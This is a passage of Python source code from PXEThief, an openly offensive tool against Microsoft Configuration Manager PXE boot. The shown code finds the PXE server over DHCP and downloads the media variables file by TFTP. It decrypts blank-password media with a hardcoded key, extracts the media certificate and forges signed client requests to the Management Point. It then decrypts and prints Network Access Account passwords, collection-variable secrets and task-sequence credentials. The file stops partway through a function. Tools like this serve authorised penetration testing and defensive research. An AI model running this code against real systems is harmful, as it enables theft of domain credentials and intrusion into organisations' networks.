# Copyright (C) 2022 Christopher Panayi, MWR CyberSec
#
# This file is part of PXEThief (https://github.com/MWR-CyberSec/PXEThief).
#
# PXEThief is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, version 3 of the License.
#
# PXEThief is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with PXEThief. If not, see <https://www.gnu.org/licenses/>.

import sys
import warnings
warnings.filterwarnings("ignore")

def check_dependencies():
    module_names = {
        'scapy': 'scapy>=2.5.0',
        'requests': 'requests>=2.27.1',
        'requests_toolbelt': 'requests-toolbelt>=0.9.1',
        'Crypto': 'pycryptodome>=3.14.1',
        'lxml': 'lxml>=4.9.1',
        'cryptography': 'cryptography>=38.0.0',
        'asn1crypto': 'asn1crypto>=1.5.1',
        'rich': 'rich>=13.0.0'
    }
    missing = []
    for mod, pkg in module_names.items():
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print("[-] Missing required packages: " + ", ".join(missing))
        print("[!] Install with: pip install " + " ".join(missing))
        sys.exit(-1)

check_dependencies()

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
conf.verb = 0

import binascii
import ipaddress
import socket
import platform
import configparser
import media_variable_file_cryptography as media_crypto
import math
import lxml.etree as ET
import requests
from requests_toolbelt import MultipartEncoder,MultipartDecoder
import zlib
import datetime
import os
import struct as pystruct
from ipaddress import IPv4Network,IPv4Address
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from asn1crypto import cms as asn1_cms
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box

console = Console(highlight=False)

def info(msg):
    console.print(f"[bold cyan][*][/] {msg}")

def success(msg):
    console.print(f"[bold green][+][/] {msg}")

def warning(msg):
    console.print(f"[bold yellow][!][/] {msg}")

def error(msg):
    console.print(f"[bold red][-][/] {msg}")

def found(msg):
    console.print(f"[bold magenta][!][/] {msg}")

def data(label, value):
    console.print(f"    [dim]{label}:[/] [bold white]{value}[/]")

def cred(label, value):
    console.print(f"    [bold yellow]{label}:[/] [bold red]{value}[/]")

#Scapy global variables
osName = platform.system()
clientIPAddress = ""
clientMacAddress = ""

#HTTP Configuration Options
USING_PROXY = False
USING_TLS = False
CERT_FILE = "output.crt"
KEY_FILE = "output-key.key"

# MECM Task Sequence Config Options
SCCM_BASE_URL = ""

# Debug Config Options
DUMP_MPKEYINFORMATIONMEDIA_XML = False
DUMP_REPLYASSIGNMENTS_XML = False
DUMP_POLICIES = False
DUMP_TS_XML = False
DUMP_TS_Sequence_XML = False

# Global Variables
BLANK_PASSWORDS_FOUND = False

def safe_decode_utf16le(data, label="data"):
    try:
        return data.decode("utf-16-le")
    except UnicodeDecodeError:
        warning(f"{label} contained invalid UTF-16-LE sequences (replaced with placeholders)")
        return data.decode("utf-16-le", errors="replace")

def cms_decrypt(private_key, encrypted_data):
    """Decrypt CMS EnvelopedData using a private key (cross-platform replacement for win32crypt.CryptDecryptMessage)."""
    content_info = asn1_cms.ContentInfo.load(encrypted_data)
    enveloped_data = content_info['content']

    recipient_infos = enveloped_data['recipient_infos']
    recipient_info = recipient_infos[0].chosen
    encrypted_key_bytes = recipient_info['encrypted_key'].native

    # Try multiple RSA padding schemes — SCCM may use PKCS1v15 or OAEP
    # PKCS1v15 can silently produce garbage keys when OAEP was used, so we
    # validate the decrypted key size against known symmetric key lengths
    valid_key_sizes = {8, 16, 24, 32}
    content_encryption_key = None

    paddings = [
        ("PKCS1v15", asym_padding.PKCS1v15()),
        ("OAEP-SHA1", asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(), label=None)),
        ("OAEP-SHA256", asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None)),
    ]

    for pad_name, pad in paddings:
        try:
            cek = private_key.decrypt(encrypted_key_bytes, pad)
            if len(cek) in valid_key_sizes:
                content_encryption_key = cek
                break
        except Exception:
            continue

    if content_encryption_key is None:
        raise ValueError("Could not decrypt content encryption key — tried PKCS1v15, OAEP-SHA1, OAEP-SHA256")

    # Get encrypted content and algorithm info
    encrypted_content_info = enveloped_data['encrypted_content_info']
    encrypted_content = encrypted_content_info['encrypted_content'].native
    algorithm = encrypted_content_info['content_encryption_algorithm']
    algo_oid = algorithm['algorithm'].dotted
    iv = algorithm['parameters'].native

    # Select cipher — prefer OID but fall back to key size
    key_len = len(content_encryption_key)
    if algo_oid == '1.2.840.113549.3.7' or key_len == 24:  # 3DES-CBC
        cipher = Cipher(algorithms.TripleDES(content_encryption_key), modes.CBC(iv))
    elif algo_oid == '2.16.840.1.101.3.4.1.2' or key_len == 16:  # AES-128-CBC
        cipher = Cipher(algorithms.AES(content_encryption_key), modes.CBC(iv))
    elif algo_oid == '2.16.840.1.101.3.4.1.42' or key_len == 32:  # AES-256-CBC
        cipher = Cipher(algorithms.AES(content_encryption_key), modes.CBC(iv))
    else:
        raise ValueError(f"Unsupported algorithm OID {algo_oid} with key size {key_len * 8} bits")

    decryptor = cipher.decryptor()
    decrypted = decryptor.update(encrypted_content) + decryptor.finalize()

    # Strip PKCS#7 padding
    pad_len = decrypted[-1]
    if 0 < pad_len <= len(decrypted) and all(b == pad_len for b in decrypted[-pad_len:]):
        decrypted = decrypted[:-pad_len]

    return decrypted

def auto_convert_pfx_to_pem(pfx_data, password_bytes, base_filename):
    """Auto-convert PFX to PEM cert+key files for mTLS use."""
    try:
        pk, cert_obj, chain = pkcs12.load_key_and_certificates(pfx_data, password_bytes)
        if cert_obj:
            cert_file = base_filename.replace('.pfx', '.crt')
            with open(cert_file, 'wb') as f:
                f.write(cert_obj.public_bytes(serialization.Encoding.PEM))
            success(f"PEM certificate written to [bold]{cert_file}[/]")
        if pk:
            key_file = base_filename.replace('.pfx', '-key.pem')
            with open(key_file, 'wb') as f:
                f.write(pk.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption()
                ))
            success(f"PEM private key written to [bold]{key_file}[/]")
    except Exception as e:
        warning(f"Could not auto-convert PFX to PEM: {e}")

def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
    """Native Python TFTP client (RFC 1350 + RFC 2348 blksize). No external tftp binary needed."""
    TFTP_PORT = 69
    OPCODE_RRQ = 1
    OPCODE_DATA = 3
    OPCODE_ACK = 4
    OPCODE_ERROR = 5
    OPCODE_OACK = 6

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)

    request = pystruct.pack("!H", OPCODE_RRQ) + remote_path.encode("ascii") + b"\x00" + b"octet" + b"\x00"
    if blksize != 512:
        request += b"blksize" + b"\x00" + str(blksize).encode("ascii") + b"\x00"

    sock.sendto(request, (server_ip, TFTP_PORT))

    file_data = bytearray()
    server_tid = None
    expected_block = 1
    negotiated_blksize = 512

    try:
        while True:
            data_recv, addr = sock.recvfrom(65536)

            if server_tid is None:
                server_tid = addr[1]
            elif addr[1] != server_tid:
                continue

            opcode = pystruct.unpack("!H", data_recv[:2])[0]

            if opcode == OPCODE_OACK:
                options = data_recv[2:].split(b"\x00")
                for i in range(0, len(options) - 1, 2):
                    if options[i].lower() == b"blksize":
                        negotiated_blksize = int(options[i + 1])
                sock.sendto(pystruct.pack("!HH", OPCODE_ACK, 0), (server_ip, server_tid))

            elif opcode == OPCODE_DATA:
                block_num = pystruct.unpack("!H", data_recv[2:4])[0]
                block_data = data_recv[4:]

                if block_num == expected_block:
                    file_data.extend(block_data)
                    sock.sendto(pystruct.pack("!HH", OPCODE_ACK, block_num), (server_ip, server_tid))
                    expected_block += 1

                    if len(block_data) < negotiated_blksize:
                        break
                elif block_num < expected_block:
                    sock.sendto(pystruct.pack("!HH", OPCODE_ACK, block_num), (server_ip, server_tid))

            elif opcode == OPCODE_ERROR:
                err_code = pystruct.unpack("!H", data_recv[2:4])[0]
                err_msg = data_recv[4:].rstrip(b"\x00").decode("ascii", errors="replace")
                raise RuntimeError("TFTP error " + str(err_code) + ": " + err_msg)
            else:
                raise RuntimeError("Unexpected TFTP opcode: " + str(opcode))
    finally:
        sock.close()

    with open(local_path, "wb") as f:
        f.write(file_data)

    return len(file_data)

def validate_ip_or_resolve_hostname(input):
    try:
        ipaddress.ip_address(input)
        ip_address = input
    except ValueError:
        try:
            ip_address = socket.gethostbyname(input.strip())
        except socket.gaierror:
            error(f"{input} does not appear to be a valid hostname or IP address (or DNS does not resolve)")
            sys.exit(0)
    return ip_address

def print_interface_table():
    warning("Set the interface to be used by scapy in [bold]manual_interface_selection_by_id[/] in settings.ini")
    console.print()
    console.print(conf.ifaces)

def get_config_section(section_name):
    config = configparser.ConfigParser(allow_no_value=True)
    config.read('settings.ini')
    return config[section_name]

def configure_scapy_networking(ip_address):
    if ip_address is not None:
        ip_address = validate_ip_or_resolve_hostname(ip_address)
        route_info = conf.route.route(ip_address, verbose=0)
        interface_ip = route_info[1]

        if interface_ip != "0.0.0.0":
            conf.iface = route_info[0]
        else:
            error(f"No route found to target host {ip_address}")
            sys.exit(-1)
    else:
        config = configparser.ConfigParser(allow_no_value=True)
        config.read('settings.ini')
        scapy_config = config["SCAPY SETTINGS"]

        if scapy_config.get("manual_interface_selection_by_id"):
            try:
                manual_selection_mode_id = scapy_config.getint("manual_interface_selection_by_id")
            except ValueError:
                error("Invalid value for [bold]manual_interface_selection_by_id[/] in settings.ini — must be an integer")
                info("Run [bold]pxethief.py 10[/] to list valid interface indexes")
                sys.exit(-1)
        else:
            manual_selection_mode_id = None

        if manual_selection_mode_id:
            info(f"Using manually selected Interface ID [bold]{manual_selection_mode_id}[/]")
            conf.iface = conf.ifaces.dev_from_index(manual_selection_mode_id)
        else:
            info("Attempting automatic interface detection")
            selection_mode = scapy_config.getint("automatic_interface_selection_mode")
            try_next_mode = False
            if selection_mode == 1:
                default_gw = conf.route.route("0.0.0.0", verbose=0)
                default_gw_ip = conf.route.route("0.0.0.0", verbose=0)[2]

                if default_gw_ip != '0.0.0.0':
                    conf.iface = default_gw[0]
                else:
                    try_next_mode = True

            if selection_mode == 2 or try_next_mode:
                loopback_range = IPv4Network('127.0.0.0/8')
                autoconfigure_ranges = IPv4Network('169.254.0.0/16')

                interfaces = scapy.interfaces.get_working_ifaces()
                for interface in interfaces:
                    ip = get_if_raw_addr(interface)
                    if ip:
                        ip = IPv4Address(inet_ntop(socket.AF_INET, ip))
                    else:
                        continue

                    if ip and not (ip in loopback_range) and not (ip in autoconfigure_ranges):
                        conf.iface = interface
                        break

    global clientIPAddress
    global clientMacAddress

    clientIPAddress = get_if_addr(conf.iface)
    mac_str = get_if_hwaddr(conf.iface)
    clientMacAddress = binascii.unhexlify(mac_str.replace(":", "").replace("-", ""))

    bind_layers(UDP, BOOTP, dport=4011, sport=68)
    bind_layers(UDP, BOOTP, dport=68, sport=4011)
    iface_desc = getattr(conf.iface, 'description', str(conf.iface))
    success(f"Using interface: [bold]{conf.iface}[/] — {iface_desc}")

def find_pxe_server():
    info("Sending DHCP Discover to find PXE boot server...")

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=clientMacAddress)/DHCP(options=[("message-type","discover"),('param_req_list',[1,3,6,66,67]),"end"])

    conf.checkIPaddr = False
    ans = srp1(pkt, timeout=10)
    conf.checkIPaddr = True

    if ans:
        packet = ans
        dhcp_options = packet[1][DHCP].options

        tftp_server = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"), None)
        if tftp_server:
            tftp_server = tftp_server.rstrip(b"\0").decode("utf-8")

            boot_file = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "boot-file-name"), None)
            if boot_file:
                boot_file = boot_file.rstrip(b"\0").decode("utf-8")
    else:
        error("No DHCP responses received with PXE boot options")
        sys.exit(-1)

    tftp_server = validate_ip_or_resolve_hostname(tftp_server.strip())

    success(f"PXE Server: [bold]{tftp_server}[/] — Boot File: [bold]{boot_file}[/]")
    return tftp_server

def get_variable_file_path(tftp_server):
    info("Asking ConfigMgr for media variables and BCD file locations...")

    pkt = IP(src=clientIPAddress,dst=tftp_server)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=[
    ("message-type","request"),
    ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
    ('pxe_client_architecture', b'\x00\x00'),
    (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")),
    ('vendor_class_id', b'PXEClient'),
    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'),
    "end"])

    ans = sr1(pkt, timeout=10, iface=conf.iface, filter="udp port 4011 or udp port 68")

    encrypted_key = None
    if ans:
        packet = ans
        dhcp_options = packet[1][DHCP].options

        option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
        if variables_file:
            packet_type = variables_file[0]
            data_length = variables_file[1]

            if packet_type == 1:
                variables_file = variables_file[2:2+data_length]
                variables_file = variables_file.decode('utf-8')
            elif packet_type == 2:
                encrypted_key = variables_file[2:2+data_length]

                string_length_index = 2 + data_length + 1
                beginning_of_string_index = 2 + data_length + 2
                string_length = variables_file[string_length_index]
                variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length]
                variables_file = variables_file.decode('utf-8')
            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")
        else:
            error("No variable file location (DHCP option 243) found in server response")
            sys.exit(-1)
    else:
        error(f"No DHCP response from MECM server {tftp_server} — check IP address and firewall rules")
        sys.exit(-1)

    found(f"Variables file: [bold]{variables_file}[/]")
    found(f"BCD file: [bold]{bcd_file}[/]")

    if encrypted_key:
        global BLANK_PASSWORDS_FOUND
        BLANK_PASSWORDS_FOUND = True
        found("[bold red]Blank password on PXE boot found![/]")
        return [variables_file, bcd_file, encrypted_key]
    else:
        return [variables_file, bcd_file]

def get_pxe_files(ip):
    if ip != None:
        info(f"Targeting user-specified host: [bold]{ip}[/]")
        tftp_server_ip = validate_ip_or_resolve_hostname(ip)
    else:
        info("Discovering PXE Server through DHCP...")
        tftp_server_ip = find_pxe_server()

    answer_array = get_variable_file_path(tftp_server_ip)

    variables_file = answer_array[0]
    bcd_file = answer_array[1]
    if BLANK_PASSWORDS_FOUND:
        encrypted_key = answer_array[2]

    var_file_name = variables_file.split("\\")[-1]
    bcd_file_name = bcd_file.split("\\")[-1]

    info(f"Downloading [bold]{var_file_name}[/] via TFTP...")
    try:
        size = tftp_download(tftp_server_ip, variables_file, var_file_name)
        success(f"Downloaded [bold]{var_file_name}[/] ({size} bytes)")
    except Exception as e:
        error(f"Failed to download media variables file via TFTP: {e}")
        sys.exit(-1)

    info(f"Downloading [bold]{bcd_file_name}[/] via TFTP...")
    try:
        size = tftp_download(tftp_server_ip, bcd_file, bcd_file_name)
        success(f"Downloaded [bold]{bcd_file_name}[/] ({size} bytes)")
    except Exception as e:
        warning(f"Failed to download BCD file: {e}")

    if BLANK_PASSWORDS_FOUND:
        config = configparser.ConfigParser(allow_no_value=True)
        config.read('settings.ini')
        general_config = config["GENERAL SETTINGS"]
        auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
        if auto_exploit_blank_password:
            warning("Attempting automatic exploitation...")
            hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
            found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
            use_encrypted_key(encrypted_key, var_file_name)
        else:
            warning("Change [bold]auto_exploit_blank_password[/] in settings.ini to 1 to attempt exploitation")
    else:
        info("User configured password detected for task sequence media")
        try:
            hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
            found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
        except Exception:
            pass
        info("Crack with hashcat using the SCCM module, then run: [bold]pxethief.py 3 <file> <cracked-password>[/]")

def generateSignedData(data, private_key):
    signature = private_key.sign(
        data,
        asym_padding.PKCS1v15(),
        hashes.SHA1()
    )
    reversed_sig = signature[::-1]
    return binascii.hexlify(reversed_sig).decode()

def generateClientTokenSignature(data, private_key):
    signature = private_key.sign(
        data,
        asym_padding.PKCS1v15(),
        hashes.SHA256()
    )
    reversed_sig = signature[::-1]
    return binascii.hexlify(reversed_sig).decode()

def deobfuscate_credential_string(credential_string):
    key_data = binascii.unhexlify(credential_string[8:88])
    encrypted_data = binascii.unhexlify(credential_string[128:])
    key = media_crypto.aes_des_key_derivation(key_data)
    last_16 = math.floor(len(encrypted_data)/8)*8
    return media_crypto._3des_decrypt(encrypted_data[:last_16], key[:24])

def decrypt_media_file(path, password):
    password_is_string = isinstance(password, str)
    info(f"Media variables file: [bold]{path}[/]")
    if password_is_string:
        info(f"Password: [bold]{password}[/]")
    else:
        info(f"Password bytes: [bold]0x{password.hex()}[/]")

    encrypted_file = media_crypto.read_media_variable_file(path)
    try:
        if password_is_string:
            key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
        else:
            key = media_crypto.aes_des_key_derivation(password)
        last_16 = math.floor(len(encrypted_file)/16)*16
        try:
            decrypted_media_file = media_crypto.aes128_decrypt(encrypted_file[:last_16], key[:16])
        except UnicodeDecodeError:
            decrypted_media_file = media_crypto.aes256_decrypt(encrypted_file[:last_16], key[:32])
        decrypted_media_file = decrypted_media_file[:decrypted_media_file.rfind('\x00')]
        wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
        success("Successfully decrypted media variables file!")
    except Exception as e:
        error(f"Failed to decrypt media variables file — check the password")
        error(f"  {e}")
        sys.exit(-1)

    return wf_decrypted_ts

def process_pxe_bootable_and_prestaged_media(media_xml):
    root = ET.fromstring(media_xml.encode("utf-16-le"))
    smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text
    smsTSMediaPFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text

    global SCCM_BASE_URL
    if SCCM_BASE_URL == "":
        info("Identifying Management Point URL from media variables...")
        SMSTSMP = root.find('.//var[@name="SMSTSMP"]')
        SMSTSLocationMPs = root.find('.//var[@name="SMSTSLocationMPs"]')
        if SMSTSMP is not None:
            SCCM_BASE_URL = SMSTSMP.text
        elif SMSTSLocationMPs is not None:
            SCCM_BASE_URL = SMSTSLocationMPs.text
        success(f"Management Point URL: [bold]{SCCM_BASE_URL}[/]")
    else:
        info(f"Using manually set Management Point URL: [bold]{SCCM_BASE_URL}[/]")

    download_and_decrypt_policies_using_certificate(smsMediaGuid, smsTSMediaPFX)

def process_full_media(password, policy):
    encrypted_policy = media_crypto.read_media_variable_file(policy)

    try:
        info(f"Password for policy decryption: [bold]{password}[/]")
        key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
        last_16 = math.floor(len(encrypted_policy)/16)*16
        decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16], key[:16])
        decrypted_ts = decrypted_ts[:decrypted_ts.rfind('\x00')]
        wf_decrypted_ts = "".join(c for c in decrypted_ts if c.isprintable())
        success(f"Successfully decrypted policy [bold]{policy}[/]!")
    except Exception as e:
        error(f"Failed to decrypt policy: {e}")
        sys.exit(-1)

    process_task_sequence_xml(wf_decrypted_ts)
    process_naa_xml(wf_decrypted_ts)

def use_encrypted_key(encrypted_key, media_file_path):
    length = encrypted_key[0]
    encrypted_bytes = encrypted_key[1:1+length]
    encrypted_bytes = encrypted_bytes[20:-12]
    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9'

    key = media_crypto.aes_des_key_derivation(key_data)
    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16], key[:16])[:10])

    LEADING_BIT_MASK = b'\x80'
    new_key = bytearray()
    for byte in struct.unpack('10c', var_file_key):
        if (LEADING_BIT_MASK[0] & byte[0]) == 128:
            new_key = new_key + byte + b'\xFF'
        else:
            new_key = new_key + byte + b'\x00'

    media_variables = decrypt_media_file(media_file_path, new_key)

    warning("Writing media variables to [bold]variables.xml[/]")
    write_to_file("variables", media_variables)

    root = ET.fromstring(media_variables.encode("utf-16-le"))
    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
    filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"

    warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
    write_to_binary_file(filename, smsTSMediaPFX)
    auto_convert_pfx_to_pem(smsTSMediaPFX, smsMediaGuid.encode(), filename)

    process_pxe_bootable_and_prestaged_media(media_variables)

def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
    smsMediaGuid = guid
    CCMClientID = smsMediaGuid
    smsTSMediaPFX = binascii.unhexlify(cert_bytes)

    pk, cert_obj, chain = pkcs12.load_key_and_certificates(smsTSMediaPFX, smsMediaGuid[:31].encode())
    private_key = pk
    success("Successfully loaded PFX file!")

    if cert_obj:
        with open("output.crt", "wb") as f:
            f.write(cert_obj.public_bytes(serialization.Encoding.PEM))
        success("PEM certificate written to [bold]output.crt[/]")
    if private_key:
        with open("output-key.pem", "wb") as f:
            f.write(private_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()
            ))
        success("PEM private key written to [bold]output-key.pem[/]")

    info("Generating client authentication headers...")

    data_bytes = CCMClientID.encode("utf-16-le") + b'\x00\x00'
    CCMClientIDSignature = str(generateClientTokenSignature(data_bytes, private_key))
    success("CCMClientID signature generated")

    CCMClientTimestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat()+'Z'
    data_bytes = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
    CCMClientTimestampSignature = str(generateClientTokenSignature(data_bytes, private_key))
    success("CCMClientTimestamp signature generated")

    data_bytes = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
    clientTokenSignature = str(generateClientTokenSignature(data_bytes, private_key))
    success("ClientToken signature generated")

    try:
        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClientIDSignature, CCMClientTimestamp, CCMClientTimestampSignature, clientTokenSignature)
    except Exception as e:
        error("Failed to retrieve policies. Possible causes:")
        console.print("    [dim]1.[/] Network connectivity — ensure HTTP port is reachable, fix DNS or hardcode [bold]SCCM_BASE_URL[/]")
        console.print("    [dim]2.[/] Signing algorithm mismatch — try swapping SHA1/SHA256 in generateSignedData/generateClientTokenSignature")
        error(f"  {e}")
        sys.exit(-1)

    for colsetting in colsettings:
        console.rule("[bold magenta]Collection Variables — All Unknown Computers[/]", style="magenta")

        is_plaintext = False
        try:
            colsetting.content.decode("utf-16-le")
            is_plaintext = True
        except (UnicodeDecodeError, AttributeError):
            pass

        if USING_TLS or is_plaintext:
            wf_dstr = safe_decode_utf16le(colsetting.content, "collection settings")
        else:
            dstr = cms_decrypt(private_key, colsetting.content)
            dstr = safe_decode_utf16le(dstr, "decrypted collection settings")
            wf_dstr = "".join(c for c in dstr if c.isprintable())

        root = ET.fromstring(wf_dstr)
        dstr = safe_decode_utf16le(zlib.decompress(binascii.unhexlify(root.text)), "decompressed collection settings")
        wf_dstr = "".join(c for c in dstr if c.isprintable())
        write_to_file("CollectionSettings", wf_dstr)
        root = ET.fromstring(wf_dstr)

        instances = root.find("PolicyRule").find("PolicyAction").findall("instance")

        for instance in instances:
            encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text
            collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text

            cred("Collection Variable", collection_var_name)
            collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
            collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
            cred("Secret", collection_var_secret)

    console.rule("[bold green]Network Access Account Configuration[/]", style="green")
    for naaConfig in naaConfigs:
        if USING_TLS:
            dstr = safe_decode_utf16le(naaConfig.content, "NAA config")
        else:
            dstr = cms_decrypt(private_key, naaConfig.content)
            dstr = safe_decode_utf16le(dstr, "decrypted NAA config")
        wf_dstr = "".join(c for c in dstr if c.isprintable())
        process_naa_xml(wf_dstr)

    console.rule("[bold green]Task Sequence Configuration[/]", style="green")
    for tsConfig in tsConfigs:
        if USING_TLS:
            dstr = safe_decode_utf16le(tsConfig.content, "task sequence config")
        else:
            dstr = cms_decrypt(private_key, tsConfig.content)
            dstr = safe_decode_utf16le(dstr, "decrypted task sequence config")
        wf_dstr = "".join(c for c in dstr if c.isprintable())
        tsSequence = process_task_sequence_xml(wf_dstr)

def process_naa_xml(naa_xml):
    root = ET.fromstring(naa_xml)
    network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")

    for naa_settings in network_access_account_xml:
        network_access_username = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessUsername']")[0].find("value").text)
        network_access_username = network_access_username[:network_access_username.rfind('\x00')]
        cred("NAA Username", network_access_username)

        network_access_password = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessPassword']")[0].find("value").text)
        network_access_password = network_access_password[:network_access_password.rfind('\x00')]
        cred("NAA Password", network_access_password)

def process_task_sequence_xml(ts_xml):
    root = ET.fromstring(ts_xml)

    pkg_name = root.xpath("//*[@name='PKG_Name']/value")[0].text
    adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[0].text
    ts_sequence_tag = root.xpath("//*[@name='TS_Sequence']/value")[0].text

    tsName = pkg_name + "-" + adv_id
    keepcharacters = (' ','.','_', '-')
    tsName = "".join(c for c in tsName if c.isalnum() or c in keepcharacters).rstrip()

    if ts_sequence_tag[:9] == "<sequence":
        tsSequence = ts_sequence_tag
    else:
        try:
            tsSequence = deobfuscate_credential_string(ts_sequence_tag)
            success(f"Decrypted TS_Sequence in [bold]{pkg_name}[/]")
        except Exception as e:
            error(f"Failed to decrypt TS_Sequence in [bold]{pkg_name}[/]: {e}")
            return

    tsSequence = tsSequence[:tsSequence.rfind(">")+1]
    tsSequence = "".join(c for c in tsSequence if c.isprintable() or c in keepcharacters).rstrip()

    if DUMP_TS_XML:
        fname = "TaskSequence_policy_" + tsName + ".xml"
        warning(f"Writing TaskSequence policy XML to [bold]{fname}[/]")
        with open(fname, "w") as f:
            f.write(tsSequence)

    if DUMP_TS_Sequence_XML:
        fname = tsName + ".xml"
        warning(f"Writing TS_Sequence XML to [bold]{fname}[/]")
        with open(fname, "w") as f:
            f.write(tsSequence)

    info(f"Searching for credentials in [bold]{pkg_name}[/]...")
    analyse_task_sequence_for_potential_creds(tsSequence)

def write_to_file(filename, contents):
    with open(filename + ".xml", "w") as f:
        f.write(contents)

def write_to_binary_file(filename, contents):
    with open(filename, "wb") as f:
        f.write(contents)

def analyse_task_sequence_for_potential_creds(ts_xml):
    tree = ET.fromstring(ts_xml).getroottree()

    keyword_list = ["password", "account", "username"]
    element_search_list = []

    for word in keyword_list:
        element_search_list.append([word, tree.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + word + '")]')])

    parent_list = []
    creds_found = False
    for word, elements in element_search_list:
        for element in elements:
            if not creds_found:
                found("Credentials found!")
                creds_found = True
            parent = element.getparent()
            if parent not in parent_list:
                parent_list.append(parent)
                step_name = parent.getparent().attrib["name"]
                console.print(f"    [dim]TS Step:[/] [bold white]{step_name}[/]")
                unique_words = [x for x in keyword_list if x != word]

                par = ET.ElementTree(parent)
                for unique_word in unique_words:
                    for el in par.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + unique_word + '")]'):
                        if el != element:
                            cred(el.attrib["name"], el.text)

                cred(element.attrib["name"], str(element.text))

    if not creds_found:
        info("No credentials identified in this Task Sequence")

def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClientIDSignature, CCMClientTimestamp, CCMClientTimestampSignature, clientTokenSignature):
    sccm_base_url = SCCM_BASE_URL
    session = requests.Session()

    if USING_TLS:
        session.verify = False
        session.cert = (CERT_FILE, KEY_FILE)
    if USING_PROXY:
        proxies = {"https": '127.0.0.1:8080'}
        session.proxies = proxies

    info("Retrieving x64UnknownMachineGUID from MECM MP...")
    r = session.get(sccm_base_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")

    root = ET.fromstring(r.text)
    clientID = root.find("UnknownMachines").get("x64UnknownMachineGUID")
    sitecode = root.find("SITECODE").text

    if DUMP_MPKEYINFORMATIONMEDIA_XML:
        with open("MPKEYINFORMATIONMEDIA.xml", "w") as f:
            f.write(r.text)

